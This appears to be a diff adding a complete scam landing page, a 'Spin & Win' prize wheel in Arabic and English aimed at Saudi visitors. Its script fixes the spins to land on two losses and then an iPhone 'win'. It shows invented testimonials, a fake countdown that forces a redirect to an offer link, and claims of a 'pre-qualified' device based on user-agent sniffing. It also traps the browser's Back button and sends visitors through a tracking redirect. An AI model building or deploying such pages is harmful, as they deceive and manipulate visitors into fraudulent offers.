@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Spin & Win</title>
+<meta name="robots" content="noindex,nofollow,noarchive">
+<link rel="icon" href="img/favicon.ico">
+<link rel="preload" as="image" href="img/apple-iphone-16-pro-natural-titanium.webp">
+<style>
+  /* ---------- БАЗОВЫЕ ПЕРЕМЕННЫЕ ---------- */
+  :root{
+    --bg:#0b111a; --panel:#0f1825; --rim:#10243c;
+    --blue:#4fc3f7; --yellow:#ffd54f; --ink:#071627;
+    --text:#eaf3ff; --muted:#9fb2cc;
+    --accent:#10c28a; --gold:#ffd54f;
+
+    /* UI: чипы, CTA, аватар */
+    --chipBg:#ffd84d; --chipBorder:#ffcc3d; --chipActive:#ffb500;
+    --ctaStart:#ffe067; --ctaEnd:#fecb35; --ctaShadow:rgba(255,193,7,.35);
+    --avatarA:#ffd54f; --avatarB:#f9b233;
+  }
+
+  /* ---------- ТЕМЫ ---------- */
+  /* дефолт — золото/синий  v1 */
+
+  /* зелёно/фиолетовая тема на подмену v2*/
+
+  /* зелёно/фиолетовая тема v2*/
+html[data-theme="gv"]{
+  --yellow:#5bff47;     /* яркий зелёный сектор */
+  --blue:#7d4dff;       /* насыщенный фиолетовый сектор */
+  --gold:#aaff66;       /* стрелка, аватары */
+
+  --chipBg:#aaff66;
+  --chipBorder:#5bff47;
+  --chipActive:#7dff4d;
+
+  --ctaStart:#aaff66;
+  --ctaEnd:#5bff47;
+  --ctaShadow:rgba(91,255,71,.35);
+
+  --avatarA:#aaff66;
+  --avatarB:#5bff47;
+}
+
+
+  /* ---------- ГЛОБАЛ ---------- */
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0;
+    font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
+    background:radial-gradient(1200px 600px at 50% -20%,#18253a 0%,#0b111a 70%);
+    color:var(--text);
+    display:flex; justify-content:center;
+  }
+/* --- стабилизация контейнера и колеса --- */
+.wrap{
+  width:100%;
+  max-width:820px;
+  margin:20px auto;
+  padding-inline:12px;          /* небольшой внутренний отступ вместо дергающегося vw */
+}
+
+  /* ---------- ШАПКА ---------- */
+  .header{
+    background:#15243a; border:1px solid #1f3657; height:56px;
+    display:flex; align-items:center; justify-content:center; gap:10px;
+    border-radius:10px; box-shadow:0 8px 26px rgba(0,0,0,.35);
+    position:relative; padding:0 54px;
+  }
+.flag {
+    position: absolute;
+    left: 10px;
+    width: 40px; /* было 32px */
+    height: 28px; /* было 22px */
+    object-fit: cover;
+    border-radius: 4px; /* было 3px */
+    box-shadow: 0 0 0 1px #254265, 0 2px 4px rgba(0,0,0,0.35); /* добавил лёгкую тень */
+}
+  /* скрываем свитчер в шапке, оставляем в DOM */
+  .header .lang{ display:none !important; }
+  .lang button{
+    border:1px solid #284569; background:#0f1b2c; color:#cfe3ff;
+    border-radius:10px; padding:6px 10px; cursor:pointer;
+  }
+  .lang button.active{ background:#1a3253; }
+
+  /* ---------- ПАНЕЛИ ---------- */
+  .panel{
+    background:linear-gradient(180deg,#0f1d2c,#0b1624);
+    border:1px solid #1c2e49; border-radius:16px; padding:16px;
+    box-shadow:0 12px 28px rgba(3,11,23,.45);
+  }
+  .panel + .panel{ margin-top:14px; }
+
+  /* ---------- КОЛЕСО ---------- */
+/* wheel */
+.wheel-area{display:flex; flex-direction:column; align-items:center; gap:12px; margin-bottom:20px;}
+.wheel-shell{
+  width:100%;                    /* больше никакого vw */
+  max-width:540px;               /* предел по макету */
+  aspect-ratio:1/1;
+  border-radius:50%;
+  position:relative;
+  background:radial-gradient(circle at 50% 50%, #1a2b42 0 56%, #0d1a2a 75% 100%);
+  box-shadow: inset 0 0 0 6px #22324b, inset 0 0 24px 12px #0c1624, 0 0 0 10px #09121d;
+}
+  .pointer{
+    position:absolute; left:50%; top:-2px; transform:translateX(-50%);
+    width:0;height:0;border-left:13px solid transparent;border-right:13px solid transparent;
+    border-bottom:20px solid var(--gold); filter:drop-shadow(0 2px 4px #000);
+  }
+/* растровое колесо */
+#wheelImg{
+  position:absolute;
+  inset:14px;
+  width:calc(100% - 28px);
+  height:calc(100% - 28px);
+  object-fit:contain;
+  transform-origin:50% 50%;
+  will-change:transform;
+  backface-visibility:hidden;    /* сглаживание субпикселей при вращении */
+  filter:drop-shadow(0 4px 10px rgba(0,0,0,.35));
+}
+  .hint{ font-size:14px; color:var(--muted); text-align:center; }
+  .timerWrap{ display:flex; align-items:center; justify-content:center; gap:10px; margin-top:4px; }
+  .timerLabel{ color:#9fb2cc; }
+  .timerBox{
+    min-width:84px; text-align:center; font-weight:900; font-size:28px; padding:8px 14px; border-radius:10px;
+    background:#0e1a2a; border:1px solid #20324d; box-shadow:inset 0 0 12px rgba(0,0,0,.25);
+  }
+  .timerBox b{ font-variant-numeric:tabular-nums; }
+
+  /* ---------- КОММЕНТЫ ---------- */
+  .comments{ background:#0f1826; border:1px solid #1a2a45; border-radius:12px; padding:10px; }
+  .cmt{
+    display:flex; align-items:flex-start; gap:10px; padding:10px 0;
+    border-bottom:1px solid #1b2b47;
+  }
+  .cmt:last-child{ border-bottom:0; }
+
+  /* аватар: подхватывает тему */
+  .cmt .avatar{
+    width:40px; height:40px; flex:0 0 40px;
+    border-radius:50%; display:grid; place-items:center;
+    font-weight:900; color:#0c1526;
+    background:linear-gradient(200deg,var(--avatarA),var(--avatarB));
+  }
+  .cmt > div{ flex:1; }
+  .meta{ font-size:12px; color:#9fb2cc; }
+  .btns{ display:flex; gap:6px; flex-wrap:wrap; font-size:13px; color:#8fb2ff; }
+
+  /* направление вручную классами */
+  .cmt.ltr{ direction:ltr; text-align:left; flex-direction:row; }
+  .cmt.rtl{ direction:rtl; text-align:right; flex-direction:row-reverse; }
+  .cmt.rtl .btns{ justify-content:flex-end; }
+
+  /* ---------- МОДАЛКИ ---------- */
+  .modal{
+    position:fixed; inset:0; background:rgba(2,8,15,.75);
+    display:none; align-items:center; justify-content:center; z-index:50;
+  }
+  .modal.show{ display:flex; }
+  .card{
+    width:min(560px,92%); background:linear-gradient(180deg,#0e1a2a,#0a1321);
+    border:1px solid #20324d; border-radius:18px; padding:22px; text-align:center;
+    box-shadow:0 18px 48px rgba(0,0,0,.5);
+  }
+  .celebrate{ font-size:30px; font-weight:900; color:#ffe072; text-shadow:0 2px 0 #6b5200; }
+  .prize{ font-size:18px; margin:8px 0 14px; }
+
+  /* CTA кнопка под тему */
+/* кнопка — собственный слой + стабилизация пульса */
+.claim{
+  display:inline-block; text-align:center; text-decoration:none; border:none; cursor:pointer;
+  width:100%; padding:16px; border-radius:12px;
+  background:linear-gradient(180deg,var(--ctaStart),var(--ctaEnd));
+  color:#311e00; font-weight:900;
+  box-shadow:0 10px 20px var(--ctaShadow);
+  will-change:transform;          /* отдельный композитный слой */
+  backface-visibility:hidden;
+  transform:translateZ(0);
+}
+  html[lang="en"] .claim{ text-transform:uppercase; letter-spacing:.3px; font-size:17px; }
+  html[lang="ar"] .claim{ font-size:19px; }
+  .claim.pulse{ animation:btnPulse 1.6s ease-in-out infinite; }
+  @keyframes btnPulse{
+    0%,100%{ transform:scale(1); box-shadow:0 10px 20px var(--ctaShadow); }
+    50%    { transform:scale(1.04); box-shadow:0 14px 26px var(--ctaShadow); }
+  }
+
+  .prizeImg{ max-width:260px; width:80%; margin:8px auto 2px; display:block; border-radius:10px; }
+
+  .confetti{ position:absolute; inset:0; pointer-events:none; overflow:hidden; }
+  .piece{ position:absolute; width:10px; height:14px; background:#ffd54f; top:-20px; animation:fall 1.8s linear infinite; opacity:.9; }
+  .piece.b{ background:#4fc3f7; }
+  .piece.c{ background:#7cf1c8; }
+  @keyframes fall{ to{ transform:translateY(110vh) rotate(540deg); } }
+
+  .sector-win{
+    filter:drop-shadow(0 0 10px rgba(255,213,79,.9)) drop-shadow(0 0 18px rgba(255,213,79,.7));
+    stroke:#ffe072 !important; stroke-width:4 !important;
+  }
+
+  #introModal .prizeImg{
+    max-width:320px; width:86%; border-radius:14px; box-shadow:0 10px 30px rgba(0,0,0,.35);
+  }
+
+  /* ---------- ЧИПЫ ЯЗЫКА (в интро), цвета — от темы ---------- */
+  .introLang{ display:flex; gap:10px; justify-content:center; margin:6px 0 14px; }
+  .lang-chip{
+    font-size:15px; font-weight:800; padding:8px 14px; border-radius:999px; cursor:pointer;
+    border:1px solid var(--chipBorder); background:var(--chipBg); color:#1b1200;
+    box-shadow:0 2px 0 rgba(0,0,0,.25), 0 0 0 2px rgba(0,0,0,.08) inset;
+    transition:filter .15s ease, transform .05s ease;
+  }
+  .lang-chip:hover{ filter:brightness(1.05); }
+  .lang-chip:active{ transform:translateY(1px); }
+  .lang-chip:focus-visible{ outline:2px solid #fff; outline-offset:2px; }
+  .lang-chip.active{
+    background:var(--chipActive); border-color:var(--chipBorder); color:#0b0b0b;
+    box-shadow:0 2px 0 rgba(0,0,0,.28), 0 0 0 2px rgba(0,0,0,.10) inset;
+  }
+
+  /* для десктопов — резерв под скроллбар, чтобы не было сдвига (мобилки игнорят, но не мешает) */
+html{ scrollbar-gutter:stable both-edges; }
+</style>
+
+
+</head>
+<body>
+
+<div class="wrap">
+  <div class="header">
+    <img src="img/flag-sa-2.webp" alt="SA" class="flag">
+    <b id="title">برنامج الولاء</b>
+    <div class="lang">
+      <button id="btnEN" aria-label="Switch to English">EN</button>
+      <button id="btnAR" class="active" aria-label="التبديل إلى العربية">AR</button>
+    </div>
+  </div>
+
+  <div id="first" class="panel">
+    <div class="wheel-area">
+      <div class="wheel-shell" id="wheelShell">
+        <div class="pointer"></div>
+        <img id="wheelImg" src="img/wheel_1024-2.webp" alt="" />
+      </div>
+    </div>
+      <div class="hint"><span id="attemptsLabel">المحاولات المتبقية:</span> <b id="tries">3</b></div>
+      <div class="hint" id="finalHint">لديك ثلاث محاولات! لا تفوّت الفرصة.</div>
+
+      <div class="timerWrap">
+        <span class="timerLabel" id="timerLabel">Offer ends in</span>
+        <div class="timerBox"><b id="countdown">60</b>s</div>
+      </div>
+    </div>
+
+    <div class="panel" style="padding:12px; margin-top:16px">
+      <div class="comments" id="commentsSA">
+
+        <!-- EN -->
+        <div class="cmt ltr">
+          <div class="avatar">R</div>
+          <div>
+            <div style="font-weight:700;color:#9dc3ff">Ramir Lassiter</div>
+            <div>Got the iPhone! Wanted an iMac, but not today…</div>
+            <div class="meta">Yesterday at 08:13</div>
+            <div class="btns"><span>Like</span> · <span>Comment</span></div>
+          </div>
+        </div>
+
+        <div class="cmt ltr">
+          <div class="avatar">T</div>
+          <div>
+            <div style="font-weight:700;color:#9dc3ff">Tony Hobbs</div>
+            <div>I hit “no win” twice, then iPhone. Wild 😅</div>
+            <div class="meta">2 days ago</div>
+            <div class="btns"><span>Like</span> · <span>Comment</span></div>
+          </div>
+        </div>
+
+        <div class="cmt ltr">
+          <div class="avatar">M</div>
+          <div>
+            <div style="font-weight:700;color:#9dc3ff">Marta Irvin</div>
+            <div>Courier brought a brand new iPhone this morning!</div>
+            <div class="meta">2 days ago</div>
+            <div class="btns"><span>Like</span> · <span>Comment</span></div>
+          </div>
+        </div>
+
+        <!-- AR -->
+        <div class="cmt rtl">
+          <div class="avatar">ع</div>
+          <div>
+            <div style="font-weight:700;color:#9dc3ff">عبدالله الشمري</div>
+            <div>صراحة توقعت مزحة، لكن في الدور الثالث طلع الآيفون! 🎉</div>
+            <div class="meta">قبل يوم · الرياض</div>
+            <div class="btns"><span>إعجاب</span> · <span>تعليق</span></div>
+          </div>
+        </div>
+
+        <div class="cmt rtl">
+          <div class="avatar">س</div>
+          <div>
+            <div style="font-weight:700;color:#9dc3ff">سارة العتيبي</div>
+            <div>محاولتين بدون فوز وبعدها فزت بقسيمة هدايا. تجربة حلوة 😄</div>
+            <div class="meta">قبل يومين · جدة</div>
+            <div class="btns"><span>إعجاب</span> · <span>تعليق</span></div>
+          </div>
+        </div>
+
+        <!-- EN -->
+        <div class="cmt ltr">
+          <div class="avatar">K</div>
+          <div>
+            <div style="font-weight:700;color:#9dc3ff">Khaled M.</div>
+            <div>Would be nicer with more colors, but the spin is fun and I won 👍</div>
+            <div class="meta">3 days ago · Dammam</div>
+            <div class="btns"><span>Like</span> · <span>Comment</span></div>
+          </div>
+        </div>
+
+        <div class="cmt ltr">
+          <div class="avatar">N</div>
+          <div>
+            <div style="font-weight:700;color:#9dc3ff">Nora Alharbi</div>
+            <div>Won a gift card on the third spin. Loved it!</div>
+            <div class="meta">2 days ago · Riyadh</div>
+            <div class="btns"><span>Like</span> · <span>Comment</span></div>
+          </div>
+        </div>
+
+        <div class="cmt ltr">
+          <div class="avatar">F</div>
+          <div>
+            <div style="font-weight:700;color:#9dc3ff">Fahad S.</div>
+            <div>Spins are quick and fun. Got the iPhone ✅</div>
+            <div class="meta">1 day ago · Jeddah</div>
+            <div class="btns"><span>Like</span> · <span>Comment</span></div>
+          </div>
+        </div>
+
+        <!-- AR -->
+        <div class="cmt rtl">
+          <div class="avatar">م</div>
+          <div>
+            <div style="font-weight:700;color:#9dc3ff">محمد القحطاني</div>
+            <div>العجلة ممتعة وفزت بقسيمة! 😎</div>
+            <div class="meta">قبل 3 أيام · الدمام</div>
+            <div class="btns"><span>إعجاب</span> · <span>تعليق</span></div>
+          </div>
+        </div>
+
+        <div class="cmt rtl">
+          <div class="avatar">ر</div>
+          <div>
+            <div style="font-weight:700;color:#9dc3ff">ريم الشمري</div>
+            <div>كنت مترددة ثم فزت في الدور الثالث 🎉</div>
+            <div class="meta">قبل يوم · جدة</div>
+            <div class="btns"><span>إعجاب</span> · <span>تعليق</span></div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+  </div>
+
+</div>
+
+<!-- INTRO MODAL -->
+<div id="introModal" class="modal" aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="introTitle" aria-describedby="introText">
+  <div class="card">
+    <img class="prizeImg" id="introHero" src="img/winner1.webp" alt="">
+    <div class="introLang" id="introLang">
+      <button class="lang-chip" id="introEN" aria-label="Switch to English">EN</button>
+      <button class="lang-chip" id="introAR" aria-label="التبديل إلى العربية">AR</button>
+    </div>
+    <div class="celebrate" id="introTitle">تم اختيارك اليوم!</div>
+    <div class="prize" id="introText"></div>
+    <div id="introBadges" style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin:8px 0 14px"></div>
+    <button class="claim" id="introBtn" aria-label="Start now">ابدأ الآن</button>
+  </div>
+</div>
+
+<!-- STAGE MODAL 1 -->
+<div id="stageModal1" class="modal" aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="st1Title" aria-describedby="st1Text">
+  <div class="card">
+    <div class="celebrate" id="st1Title">اقتربت!</div>
+    <div class="prize" id="st1Text">لديك محاولة إضافية. اضغط «موافق» لتدوير العجلة مرة أخرى.</div>
+    <button class="claim" id="st1Btn">موافق</button>
+  </div>
+</div>
+
+<!-- STAGE MODAL 2 -->
+<div id="stageModal2" class="modal" aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="st2Title" aria-describedby="st2Text">
+  <div class="card">
+    <div class="celebrate" id="st2Title">المحاولة الأخيرة!</div>
+    <div class="prize" id="st2Text">دورة أخيرة — حظًا موفقًا!</div>
+    <button class="claim" id="st2Btn">موافق</button>
+  </div>
+</div>
+
+<!-- WIN MODAL -->
+<div id="winModal" class="modal" aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="winTitle" aria-describedby="winText">
+  <div class="confetti" id="confetti"></div>
+  <div class="card">
+    <img class="prizeImg" src="img/apple-iphone-16-pro-natural-titanium.webp" alt="iPhone 16 Pro">
+    <div class="celebrate" id="winTitle">تهانينا!</div>
+    <div class="prize" id="winText">أنت على بُعد خطوة واحدة من جائزتك! اضغط «متابعة» لإتمام الخطوة الأخيرة.</div>
+    <a href="https://mst.luvesso.com/click?lp=1" class="claim cta-button" id="claimBtn" rel="noreferrer" aria-label="Continue">متابعة</a>
+  </div>
+</div>
+
+<script>
+/* ========= LANG & TEXT ========= */
+var urlLang = new URLSearchParams(location.search).get('lang');
+var LANG = urlLang ? (urlLang.toLowerCase()==='ar' ? 'AR' : 'EN') : 'AR';
+
+var i18n = {
+  EN: {
+    title:"LOYALTY PROGRAM",
+    hint:"You have three attempts! Don’t miss your chance.",
+    timerLabel:"Offer ends in",
+    sectors:[
+      {t:"iPhone 16 Pro", color:"yellow"},
+      {t:"Try again 🚫",  color:"blue"},
+      {t:"Galaxy S24",   color:"yellow"},
+      {t:"No win 🚫",    color:"blue"},
+      {t:"Huawei Pura 70", color:"yellow"},
+      {t:"Try again 🚫", color:"blue"},
+      {t:"Gift Card",    color:"yellow"},
+      {t:"No win 🚫",    color:"blue"}
+    ],
+    attempts:"Attempts left:",
+    introTitle:"Limited-Time Invite!",
+    introBadges: ["100% free", "No registration", "Winners daily"],
+    ok:"Start now",
+    st1Title:"Almost there!",
+    st1Text:"You have another try. Tap “Start now” to spin again.",
+    st2Title:"Last attempt!",
+    st2Text:"One more spin — tap “Start now”. Good luck!",
+    winTitle:"Great!",
+    winText:"You’re one step away from your prize! Tap “Continue” to finish.",
+    claim:"Continue"
+  },
+  AR: {
+    title:"برنامج الولاء",
+    hint:"لديك ثلاث محاولات! لا تفوّت الفرصة.",
+    timerLabel:"ينتهي العرض خلال",
+    sectors:[
+      {t:"‏iPhone 16 Pro", color:"yellow"},
+      {t:"حاول مرة أخرى 🚫", color:"blue"},
+      {t:"Galaxy S24",   color:"yellow"},
+      {t:"بدون فوز 🚫",  color:"blue"},
+      {t:"Huawei Pura 70", color:"yellow"},
+      {t:"حاول مرة أخرى 🚫", color:"blue"},
+      {t:"بطاقة هدايا", color:"yellow"},
+      {t:"بدون فوز 🚫",  color:"blue"}
+    ],
+    attempts:"المحاولات المتبقية:",
+    introTitle:"دعوة لفترة محدودة!",
+    introBadges: ["مجاني 100%", "بدون تسجيل", "فائزون يوميًا"],
+    ok:"ابدأ الآن",
+    st1Title:"اقتربت!",
+    st1Text:"لديك محاولة إضافية. اضغط «ابدأ الآن» لتدوير العجلة مرة أخرى.",
+    st2Title:"المحاولة الأخيرة!",
+    st2Text:"دورة أخيرة — اضغط «ابدأ الآن». حظًا موفقًا!",
+    winTitle:"تهانينا!",
+    winText:"أنت على بُعد خطوة واحدة من جائزتك! اضغط «متابعة» لإتمام الخطوة الأخيرة.",
+    claim:"متابعة"
+  }
+};
+var sectors=i18n[LANG].sectors.slice();
+
+function setQueryParam(key,val){
+  var u = new URL(location.href);
+  if (val==null) u.searchParams.delete(key); else u.searchParams.set(key,val);
+  history.replaceState(null,'',u.toString());
+}
+
+function applyLang(){
+  var T=i18n[LANG];
+  document.getElementById('title').textContent=T.title;
+  document.getElementById('attemptsLabel').textContent=T.attempts;
+  document.getElementById('finalHint').textContent=T.hint;
+  document.getElementById('timerLabel').textContent=T.timerLabel;
+
+  var el;
+  el=document.getElementById('introTitle'); if(el) el.textContent=T.introTitle;
+  el=document.getElementById('introBtn');   if(el) el.textContent=T.ok;
+
+  el=document.getElementById('st1Title'); if(el) el.textContent=T.st1Title;
+  el=document.getElementById('st1Text');  if(el) el.textContent=T.st1Text;
+  el=document.getElementById('st1Btn');   if(el) el.textContent=T.ok;
+
+  el=document.getElementById('st2Title'); if(el) el.textContent=T.st2Title;
+  el=document.getElementById('st2Text');  if(el) el.textContent=T.st2Text;
+  el=document.getElementById('st2Btn');   if(el) el.textContent=T.ok;
+
+  document.getElementById('winTitle').textContent=T.winTitle;
+  document.getElementById('winText').innerHTML=T.winText;
+  document.getElementById('claimBtn').textContent=T.claim;
+
+  document.documentElement.lang=(LANG==='AR'?'ar':'en');
+  document.documentElement.dir =(LANG==='AR'?'rtl':'ltr');
+
+  // переключатели (подсветка)
+  var btnEN = document.getElementById('btnEN');
+  var btnAR = document.getElementById('btnAR');
+  if(btnEN && btnAR){
+    btnEN.classList.toggle('active', LANG==='EN');
+    btnAR.classList.toggle('active', LANG==='AR');
+  }
+  var ie = document.getElementById('introEN');
+  var ia = document.getElementById('introAR');
+  if(ie && ia){
+    ie.classList.toggle('active', LANG==='EN');
+    ia.classList.toggle('active', LANG==='AR');
+  }
+
+  // wheel
+  sectors=T.sectors.slice();
+  buildWheel();
+}
+
+function setLang(next){
+  if (next===LANG) return;
+  LANG = next;
+  setQueryParam('lang', next.toLowerCase());
+  applyLang();
+  fillIntroCopy();
+}
+
+function bindLangControls(){
+  var btnEN = document.getElementById('btnEN');
+  var btnAR = document.getElementById('btnAR');
+  if(btnEN) btnEN.onclick = function(){ setLang('EN'); };
+  if(btnAR) btnAR.onclick = function(){ setLang('AR'); };
+
+  var ie = document.getElementById('introEN');
+  var ia = document.getElementById('introAR');
+  if(ie) ie.onclick = function(){ setLang('EN'); };
+  if(ia) ia.onclick = function(){ setLang('AR'); };
+}
+
+/* ========= INTRO COPY ========= */
+function detectUA(){
+  var ua = navigator.userAgent || '';
+  var isAndroid = /Android/i.test(ua);
+  var isIphone  = /iPhone|iPad|iPod/i.test(ua);
+  var isChrome  = /Chrome|CriOS/i.test(ua);
+  var isSafari  = /Safari/i.test(ua) && !/Chrome|CriOS/i.test(ua);
+  var isFirefox = /Firefox|FxiOS/i.test(ua);
+
+  var devEN = isIphone ? "iOS" : (isAndroid ? "Android" : "your device");
+  var devAR = isIphone ? "iOS" : (isAndroid ? "Android" : "جهازك");
+  var brEN  = isChrome ? "Chrome" : isSafari ? "Safari" : isFirefox ? "Firefox" : "your browser";
+  var brAR  = isChrome ? "Chrome" : isSafari ? "Safari" : isFirefox ? "Firefox" : "متصفحك";
+  return {devEN:devEN, devAR:devAR, brEN:brEN, brAR:brAR};
+}
+function safeIntroText(dev, br){
+  var frag = document.createDocumentFragment();
+  var s1 = document.createElement('span');
+  var brEl = document.createElement('br');
+  var s2 = document.createElement('span');
+
+  if (LANG==='EN') {
+    s1.textContent = "Today only: you’re eligible to try your luck.";
+    s2.append("Your ");
+    var b1=document.createElement('b'); b1.textContent = dev;
+    s2.append(b1, " on ");
+    var b2=document.createElement('b'); b2.textContent = br;
+    s2.append(b2, " is pre-qualified. Spin now!");
+  } else {
+    s1.textContent = "لفترة اليوم فقط: تم تأهيلك لتجربة الحظ.";
+    var b1a=document.createElement('b'); b1a.textContent = (dev==="your device" ? "جهازك" : dev);
+    var b2a=document.createElement('b'); b2a.textContent = (br==="your browser" ? "متصفحك" : br);
+    s2.append(b1a, " مع ", b2a, " مؤهلان مسبقًا. ابدأ الآن!");
+  }
+  frag.append(s1, brEl, s2);
+  return frag;
+}
+function fillIntroCopy(){
+  var T = i18n[LANG];
+  var d = detectUA();
+  var introTitle = document.getElementById('introTitle');
+  var introText  = document.getElementById('introText');
+
+  introTitle.textContent = T.introTitle;
+  introText.innerHTML = "";
+  introText.appendChild(safeIntroText(LANG==='EN'?d.devEN:d.devAR, LANG==='EN'?d.brEN:d.brAR));
+
+  var badgeWrap = document.getElementById('introBadges');
+  badgeWrap.innerHTML = '';
+  T.introBadges.forEach(function(text){
+    var span = document.createElement('span');
+    span.className = 'badge';
+    span.style.cssText = "background:#11304b;border:1px solid #29507a;padding:6px 10px;border-radius:999px;font-size:12px";
+    span.textContent = text;
+    badgeWrap.appendChild(span);
+  });
+
+  var ib = document.getElementById('introBtn'); if(ib) ib.textContent = (LANG==='EN') ? i18n.EN.ok : i18n.AR.ok;
+}
+
+/* ========= WHEEL (RASTER IMG) ========= */
+var wheelEl = document.getElementById('wheelImg'); // крутим картинку
+var N = 8, STEP = 360 / N;                          // нужны только для расчётов углов
+
+/* ========= THEME (wheel + accent colors) ========= */
+var urlTheme = new URLSearchParams(location.search).get('theme'); // gb | gv
+var THEMES = {
+  gb: { src: 'img/wheel_1024-1.webp', offset: 22 }, // gold+blue
+  gv: { src: 'img/wheel_1024-3m.webp', offset: 22 }  // green+violet
+};
+var THEME_KEY = (urlTheme||'gb').toLowerCase();
+if (!THEME_KEY || !THEMES[THEME_KEY]) THEME_KEY = 'gb';
+
+function applyTheme(){
+  // data-атрибут на <html> — для CSS-переключения палитры
+  document.documentElement.setAttribute('data-theme', THEME_KEY);
+
+  // подменяем картинку колеса и оффсет под стрелку
+  var cfg = THEMES[THEME_KEY];
+  if (wheelEl && wheelEl.src.indexOf(cfg.src) === -1) wheelEl.src = cfg.src;
+  OFFSET = cfg.offset;
+}
+
+
+// рендерить ничего не нужно — колесо уже растровое
+function buildWheel(){ /* no-op: using raster wheel image */ }
+
+
+
+/* ========= GAME FLOW ========= */
+var triesEl = document.getElementById('tries');
+var spins = 0, currentAngle = 0;
+var idxIphone = 0, idxBlue1 = 1, idxBlue2 = 3;
+var sequence = [idxBlue1, idxBlue2, idxIphone];
+var currentWinIdx = null; // оставим, если где-то ещё читается
+var OFFSET = 22;
+
+function setLangButtonsDisabled(v){
+  var en = document.getElementById('btnEN');
+  var ar = document.getElementById('btnAR');
+  if(en) en.disabled = v;
+  if(ar) ar.disabled = v;
+}
+
+function targetAngleForIndex(idx){
+  var POINTER_ANGLE = -90; // стрелка сверху
+  var center  = -90 + idx*STEP + STEP/2;
+  var desired = POINTER_ANGLE - center + OFFSET;
+  var delta   = ((desired - (currentAngle % 360)) + 360) % 360;
+  var extra   = 360*5;
+  var jitter  = (Math.random()*6 - 3);
+  return currentAngle + extra + delta + jitter;
+}
+
+function doSpin(){
+  if (spins >= 3 || !wheelEl) return;
+  setLangButtonsDisabled(true);
+
+  var idx = sequence[spins];
+  currentWinIdx = idx;
+
+  var target = targetAngleForIndex(idx);
+  wheelEl.style.transition = 'transform 5.2s cubic-bezier(.17,.67,.08,1.02)';
+  wheelEl.style.transform  = 'rotate(' + target + 'deg)';
+  wheelEl.addEventListener('transitionend', onEnd, { once:true });
+
+  function onEnd(){
+    currentAngle = target;
+    spins++;
+    triesEl.textContent = (3 - spins);
+
+    if (spins === 1){
+      var m1 = document.getElementById('stageModal1');
+      m1.classList.add('show');
+      setLangButtonsDisabled(false);
+      document.getElementById('st1Btn').onclick = function(){
+        m1.classList.remove('show'); setTimeout(doSpin, 350);
+      };
+    } else if (spins === 2){
+      var m2 = document.getElementById('stageModal2');
+      m2.classList.add('show');
+      setLangButtonsDisabled(false);
+      document.getElementById('st2Btn').onclick = function(){
+        m2.classList.remove('show'); setTimeout(doSpin, 350);
+      };
+    } else {
+      showWinModalDelayed();
+    }
+  }
+}
+
+
+/* ===== win popup ===== */
+var modal=document.getElementById('winModal');
+function showWinModalDelayed(){
+/*   if(currentWinIdx !== null){
+    var winPath = g.querySelector('path[data-idx="'+currentWinIdx+'"]');
+    if (winPath) winPath.classList.add('sector-win');
+  } */
+  var DELAY_MS = 2000;
+  setTimeout(function(){
+    var box=document.getElementById('confetti');
+    box.innerHTML='';
+    for(var i=0;i<80;i++){
+      var d=document.createElement('div');
+      d.className='piece'+(['',' b',' c'][Math.floor(Math.random()*3)]);
+      d.style.left=(Math.random()*100)+'%';
+      d.style.animationDelay=(Math.random()*1.2)+'s';
+      d.style.transform='translateY(-20px) rotate('+ (Math.random()*360) +'deg)';
+      box.appendChild(d);
+    }
+    modal.classList.add('show');
+    var cb=document.getElementById('claimBtn'); if(cb) cb.classList.add('pulse');
+    setLangButtonsDisabled(false);
+  }, DELAY_MS);
+}
+
+/* ===== countdown ===== */
+var countdownEl = document.getElementById('countdown');
+var timeLeft = 60;
+var OFFER_LINK = '{offer_link}';
+function tick(){
+  countdownEl.textContent = timeLeft;
+  if(timeLeft<=0){
+    window.location.href = OFFER_LINK;
+    return;
+  }
+  timeLeft--;
+  setTimeout(tick,1000);
+}
+
+/* ===== INIT ===== */
+function applyLangAndInit(){
+  applyTheme();          // <— НОВОЕ
+  applyLang();
+  fillIntroCopy();
+  bindLangControls();
+  tick();
+
+  var intro = document.getElementById('introModal');
+  intro.classList.add('show');
+
+  var introBtn = document.getElementById('introBtn');
+  introBtn.classList.add('pulse');
+  introBtn.onclick = function(){
+    introBtn.classList.remove('pulse');
+    intro.classList.remove('show');
+    setTimeout(doSpin,350);
+  };
+}
+applyLangAndInit();
+
+/* light back-trap */
+(function trapBack(){
+  try{
+    var URL=location.href.split(/[#]/)[0];
+    for(var i=0;i<10;i++) history.pushState({},"",URL+"#");
+    onpopstate=function(e){ if(e.state) location.replace('#'); };
+  }catch(_){}
+})();
+</script>
+
+<!-- Backunder config -->
+<script>
+  // var back = '';
+  var under   = 'https://mst.luvesso.com/click?key=f40ee2e1f280d169adb5&clickid={clickid}&campaign_id={campaign_id}&landing_id={landing_id}&country={country}&browser_name={browser_name}&language={language}&t9={t9}&city={city}';
+  var delay   = 3000;
+  var ctaClass = 'cta-button';
+</script>
+<script src="backunder.js" defer></script>
+<!-- /Backunder -->
+
+</body>
+</html>
